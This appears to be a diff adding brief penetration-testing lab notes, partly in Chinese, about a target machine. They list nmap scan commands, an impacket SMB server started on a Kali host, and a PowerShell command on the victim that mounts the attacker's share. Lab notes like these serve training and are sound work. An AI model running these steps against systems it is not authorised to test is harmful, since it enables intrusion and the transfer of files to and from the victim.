@@ -1,0 +1,20 @@
+nmap -sV -sC -Pn 10.11.1.79 > nmap.txt
+nmap -sV -sC -sS -Pn -p 8009 10.11.1.79 > nmapsss.txt
+nmap -p- 10.11.1.79 > nmapall.txt
+
+1.這台是BOF,發現機器名稱是maria，找到之前紀錄是chris有maria用戶
+2.在chris機器上有服務8009
+
+
+kali:提供samba服務
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py timmy `pwd`
+
+victim:連接samba
+powershell New-PSDrive -Name "timmy" -PSProvider "FileSystem" -Root "\\192.168.119.134\timmy"
+進入到samba資料夾
+cd timmy:
+echo 123 > 123.txt
+
+
+cluster-howto.html
+for /r \ %i in (*howto*) do @echo %i
